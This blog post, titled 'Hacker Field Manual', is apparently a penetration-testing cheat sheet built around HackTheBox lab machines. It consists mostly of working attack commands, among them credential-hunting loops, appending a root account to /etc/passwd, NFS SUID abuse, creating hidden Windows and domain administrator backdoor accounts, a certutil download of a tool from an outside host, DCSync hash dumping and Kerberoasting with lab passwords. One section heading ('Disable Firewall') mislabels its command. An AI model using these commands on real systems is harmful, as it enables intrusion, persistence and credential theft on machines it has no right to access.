---
layout: post
title:  "Hacker Field Manual"
categories: hfm
tags: cheatsheet
---

## Information Gathering
### Nmap (Ports/Services)
```
sudo nmap -sT -sV -sC -O -p- -T4 --min-rate=1000 $IP  
```

```

```

### ffuf (Directories/Subdomain/Files)
```session
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt:FUZZ -u $URL/FUZZ -c
```

```session
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt:FUZZ -u $URL/FUZZ -c
```

```session
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt:FUZZ -u $URL -H "HOST: FUZZ.domain.htb" -c
```

`-recursion -recursion-depth 1`

When raft fails
```
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-big.txt:FUZZ -u $URL/FUZZ -c
```
### Nikto (Identify Technology)

```
nikto -h $URL -C all
```

# Linux System Enumeration

## Upgrade Shell
```session
python -c 'import pty; pty.spawn("/bin/bash")'
```
OR
```session
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
Get me colors and an alias
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color
alias ll='ls -lsaht --color=auto'
```

Ctrl + Z to Background Process

```session
stty raw -echo ; fg ; reset
stty columns 200 rows 200
```
## Various Capabilities
```
which gcc
which cc
which python
which perl
which wget
which curl
which fetch
which nc
which ncat
which nc.traditional
which socat
```
## Arch
```
file /bin/bash
```
## Kernel
```
uname -a
```
## Issue/Release
```
cat /etc/issue
cat /etc/*-release
```
## Sudo permissions
```
sudo -l
ls -lsaht /etc/sudoers
```
## Groups
```
groups <user>
```
## Environmental Variables
```
env
```
## Users?
```
cd /home/; ls -lsaht
```

```
cat /etc/passwd | grep -vE 'nologin|sync|false'
cat /etc/passwd | grep -v nologin | grep -v false
cat /etc/passwd | grep -v "nologin\|false\|sync"
```
## Web Configs containing credentials
```
cd /var/www/html/; ls -lsaht
```
## SUID Binaries
```
find / -perm -u=s -type f 2>/dev/null
```
## GUID Binaries
```
find / -perm -g=s -type f 2>/dev/null
```
## getcap
Get Granted/Implicit (Required by a Real User) Capabilities of all files recursively throughout the system and pipe all error messages to /dev/null.

```
getcap -r / 2>/dev/null
```
## Netstat
```
netstat -antup
netstat -tunlp
```
## Is anything vulnerable running as root?
```
ps aux | grep -i 'root' --color=auto
```
## MYSQL
```
mysql -uroot -p
sqldump -u root -p toor > dbname.sql
```

Enter Password:
root : root
root : toor
root :
## /etc/
```
cd /etc/; ls -lsaht
```

Anything other than root here?

- Any config files left behind?
` ls -lsaht |grep -i ‘.conf’ --color=auto`
- If we have root priv information disclosure - are there any .secret in /etc/ files?
`ls -lsaht |grep -i ‘.secret’ --color=auto`
## SSH Keys
```
ls -lsaR /home/
```
## Files that may have interesting stuff
```
ls -lsaht /var/lib/
ls -lsaht /var/db/
ls -lsaht /opt/
ls -lsaht /tmp/
ls -lsaht /var/tmp/
ls -lsaht /dev/shm/
```
## File Transfer Capability
```
which wget
which curl
which nc
which fetch (BSD)

ls -lsaht /bin/ |grep -i 'ftp' --color=auto
```
## NFS? 
Can we exploit weak NFS Permissions?
```
cat /etc/exports
```
## no_root_squash
[https://recipeforroot.com/attacking-nfs-shares/](https://recipeforroot.com/attacking-nfs-shares/)

On Attacking Machine
```
mkdir -p /mnt/nfs/
mount -t nfs -o vers=<version 1,2,3> $IP:<NFS Share> /mnt/nfs/ -nolock
gcc suid.c -o suid
cp suid /mnt/nfs/
chmod u+s /mnt/nfs/suid
su <user id matching target machine's user-level privilege.>
```

On Target Machine

```
user@host$ ./suid
```
## File mounts
Any exotic file system mounts/extended attributes?
```
cat /etc/fstab
```
## User creation
Can we write as a low-privileged user to /etc/passwd?
```
openssl passwd -1
i<3hacking
$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.
echo 'cidney:$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.:0:0:cidney:/home/cidney:/bin/bash' >> /etc/passwd
su cidney
id
```
## Cron.
```
crontab –u root –l
```

Look for unusual system-wide cron jobs:

```
cat /etc/crontab
ls /etc/cron.*
```
## File ownership
Bob is a user on this machine. What is every single file he has ever created?
```
find / -user aero 2>/dev/null
```
## Got Mail?
```
cd /var/mail/; ls -lsaht
```
## Logs
must be in the adm group
```session
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```

## Config file Hunting

###  .conf, .config, .cnf 
```
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```



```
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```


## Credential Hunting

### .config

```
for i in $(find / -name *.config 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```

### .conf

```
for i in $(find / -name *.conf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```

### .cnf

```
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```


### .sh files

```
for i in $(find / -name *.sh 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```

### .ini files
```
for i in $(find / -name *.ini 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```
### credentials in .old files

```
for i in $(find / -name *.old 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```

```
for l in $(echo ".old");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```

## Find DB files
```
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: "$l;find/ -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```

## Find Scripts

```
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: "$l;find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```

run these when you've exhaused all the above:
### PSPY

### Linpeas

# Windows System Enumeration

## users and groups
```
whoami /all
net users
net localgroup
net user <username>
net localgroup administrators
```
## network status
```
netstat -anoy
route print
arp -A
```
## firewall
```
netsh advfirewall firewall show rule name=all
netsh advfirewall firewall show rule name=inbound
netsh advfirewall firewall show rule name=outbounD
netsh firewall show state
netsh firewall show config
```
## scheduled tasks
```
schtasks /query /fo LIST /v > schtasks.txt
```
## find passwords
```
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini
dir /s pass == cred == vnc == .config
findstr /spin "password" .
```
## windows shares
```
NET SHARE
NET USE
--> CREATE A SHARE ON WINDOWS FROM THE COMMAND LINE:
NET SHARE <sharename>=<drive/folderpath> /remark: "This is my share."
--> MOUNT A WINDOWS SHARE FROM THE COMMAND LINE:
NET USE Z: [\\COMPUTER_NAME\SHARE_NAME](file://COMPUTER_NAME/SHARE_NAME) /PERSISTENT:YES
--> UNMOUNT SHARE:
NET USE Z: /DELETE
--> DELETE A SHARE ENTIRLE
NET SHARE /DELETE
```
## Find weak file permissions
```
accesschk.exe -uwqs Users c:*.*
```

A part of group "Authenticated Users" - you would be surprised if you have a real user.

```
accesschk.exe -uwqs "Authenticated Users" c:*.*
```
## Add Administrator Account
```
cmd.exe /c net user c1dn3y superPassword /add
cmd.exe /c net localgroup administrators c1dn3y /add
cmd.exe /c net localgroup "Remote Desktop Users" c1dn3y /add
```
## Add a Windows Domain Administrator
```
cmd.exe /c net user hacker superPassword /add
net localgroup Administrators hacker /ADD /DOMAIN
net localgroup "Remote Desktop Users" hacker /ADD /DOMAIN
net group "Domain Admins" hacker /ADD /DOMAIN
net group "Enterprise Admins" hacker /ADD /DOMAIN
net group "Schema Admins" hacker /ADD /DOMAIN
net group "Group Policy Creator Owners" hacker /ADD /DOMAIN
```
## Access Check enumeration
```
accesschk.exe /accepteula (always do this first!!!!!)
accesschk.exe -ucqv [service_name] (requires sysinternals accesschk!)
accesschk.exe -uwcqv "Authenticated Users" * (won't yield anything on Win 8)
accesschk.exe -ucqv [service_name]
#Find ALL weak folder permissions, per drive.
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwqs Users c:*.*
accesschk.exe -uwqs "Authenticated Users" c:*.*
```
## Code Compilation
```
apt-get install mingw-w64

Cross-Compilation Reference:
Ci686-w64-mingw32-gcc hello.c -o hello32.exe
32-bitx86_64-w64-mingw32-gcc hello.c -o hello64.exe
64-bit # C++i686-w64-mingw32-g++ hello.cc -o hello32.exe
32-bitx86_64-w64-mingw32-g++ hello.cc -o hello64.exe # 64-bit
```

## hotfixes
```
wmic qfe list
```

## file transfer
```
certutil -urlcache -f -split http://10.10.14.63:4321/SharpUp.exe sharpup.exe
```

## Enable RDP 

```
net user /add hacker Password123!! 
net localgroup administrators hacker /add
net localgroup "Remote Desktop Users" hacker /add 
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes 
```

```
reg add HKEY_LOCAL_MACHINE\Software\Microsoft\WindowsNT\CurrentVersion\Winlogon\SpecialAccounts\UserList /v hacker /t REG_DWORD /d 0
```

## Disable Firewall

```
Set-ItemProperty -Path 'HKLM:\\System\\CurrentControlSet\\Control\\Terminal Server' -name "fDenyTSConnections" -value 0
```

# Domain Enumeratio


## secretsdump
```
impacket-secretsdump -just-dc 'svc_loanmgr:Moneymakestheworldgoround!'@10.10.10.175 -outputfile dcsync_hashes
```

## enumerate domain controller 
[https://www.g0dmode.biz/active-directory-enumeration/computer-enumeration/domain-controllers](https://www.g0dmode.biz/active-directory-enumeration/computer-enumeration/domain-controllers)

```
([ADSISearcher]"(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))").FindAll()

net group "domain controllers" /domain

sudo nmap -Pn -T4 -p 389,636 --script ldap-rootdse <domain-controller-ip> | grep dnsHostName | sort -u
```

## remote bloodhound

[https://notes.benheater.com/books/active-directory/page/remote-bloodhound](https://notes.benheater.com/books/active-directory/page/remote-bloodhound)

```
bloodhound-python -u fsmith -p Thestrokes23 -d egotistical-bank.local -dc sauna.egotistical-bank.local -ns 10.10.10.175 -c All
```

## GetUserSPNs.py
```
GetUserSPNs.py active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
```


## ldapsearch

```
ldapsearch -H ldap://10.10.10.100 -x -D "active\SVC_TGS" -W -b DC=active,DC=htb "(objectClass=user)" | grep sAMAccountName

ldapsearch -H ldap://10.10.10.100 -x -D "active\SVC_TGS" -W -b DC=active,DC=htb "(objectClass=computer)" | grep sAMAccountName

ldapsearch -x -H 'ldap://10.10.10.100' -D 'SVC_TGS' -w 'GPPstillStandingStrong2k18' -b "dc=active,dc=htb" -s sub "(&(objectCategory=person)(objectClass=user)(! (useraccountcontrol:1.2.840.113556.1.4.803:=2))(serviceprincipalname=*/*))" serviceprincipalname | grep -B 1 servicePrincipalName
```